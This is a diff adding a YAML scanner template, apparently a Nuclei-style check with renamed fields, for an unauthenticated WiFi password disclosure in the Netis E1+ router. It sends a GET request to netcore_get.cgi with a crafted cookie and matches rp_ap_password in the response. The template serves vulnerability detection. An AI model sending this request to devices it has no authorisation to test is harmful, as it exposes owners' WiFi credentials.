@@ -1,0 +1,28 @@
+id: netis-info-leak
+brief:
+    title: Netis E1+ V1.2.32533 - WiFi Password Disclosure
+    by: gy741
+    level: high
+    about: A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.
+    label:
+        - netis
+        - exposure
+        - edb
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}//netcore_get.cgi'
+      head:
+        Cookie: homeFirstShow=yes
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - rp_ap_password
+            - rp_ap_ssid
+          in: body
+          need: all
